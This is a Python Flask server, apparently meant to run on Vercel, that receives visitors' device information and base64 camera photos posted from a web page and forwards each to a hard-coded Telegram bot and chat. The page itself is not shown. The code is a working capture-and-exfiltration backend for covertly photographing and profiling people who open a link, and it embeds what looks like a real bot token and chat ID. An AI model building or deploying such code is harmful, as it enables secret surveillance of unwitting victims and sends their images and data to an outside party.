from flask import Flask, request, jsonify, render_template
import os
import base64
import json
import requests
from datetime import datetime

app = Flask(__name__)

# Create directories in /tmp (Vercel's writable directory)
PHOTO_DIR = "/tmp/captured_photos"
INFO_DIR = "/tmp/client_info"
os.makedirs(PHOTO_DIR, exist_ok=True)
os.makedirs(INFO_DIR, exist_ok=True)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '7842091597:AAGtnLil1fTmAy_sk__U5yQoun0f8-WBjSA'  # Replace with your bot's API token
CHAT_ID = '1901173676'  # Replace with the target chat ID where you want to send messages

# Function to send a text message via Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

# Function to send a photo via Telegram
def send_telegram_photo(photo_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        payload = {'chat_id': CHAT_ID}
        response = requests.post(url, data=payload, files=files)
    return response.json()

@app.route("/")
def index():
    return render_template("index.html")  # Ensure 'index.html' is in the 'templates' folder

@app.route("/collect", methods=["POST"])
def collect_info():
    try:
        data = request.json
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(INFO_DIR, f"client_{timestamp}.json")
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        
        # Send the collected data to Telegram
        message = f"New client information collected:\n\n{json.dumps(data, indent=4)}"
        send_telegram_message(message)

        return jsonify({"message": "Client info saved successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/upload-photo", methods=["POST"])
def upload_photo():
    try:
        data = request.json
        photo_data = data.get("photo", "")
        if not photo_data.startswith("data:image/jpeg;base64,"):
            return jsonify({"error": "Invalid image format"}), 400
        
        # Decode and save image
        photo_data = photo_data.replace("data:image/jpeg;base64,", "")
        img_data = base64.b64decode(photo_data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(PHOTO_DIR, f"photo_{timestamp}.jpg")

        with open(filename, "wb") as f:
            f.write(img_data)
        
        # Send the photo to Telegram
        send_telegram_photo(filename)

        return jsonify({"message": "Photo saved and sent successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
